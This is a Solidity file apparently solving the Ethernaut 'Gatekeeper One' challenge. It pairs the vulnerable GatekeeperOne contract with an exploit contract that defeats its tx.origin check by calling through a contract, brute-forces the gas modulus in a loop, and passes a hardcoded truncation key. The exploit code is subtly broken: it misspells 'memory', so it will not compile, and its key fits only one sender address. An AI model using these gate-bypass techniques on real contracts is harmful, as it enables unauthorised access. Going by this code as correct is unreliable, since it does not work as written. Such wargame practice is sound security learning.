// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Exp12 {
    function exploit(address target) external {
        bytes8 key = bytes8(0x0000000100005352);
        
        bytes memmory data = abi.encodeWithSelector(
            GatekeeperOne.enter.selector,
            key
        );
    
        for (uint i = 0; i < 8191; i++) {
            (bool success, bytes memory ret) = target.call{gas: 3000000 + i}(data);

            if (success) {
                break;
            }
        }
        
    }
}
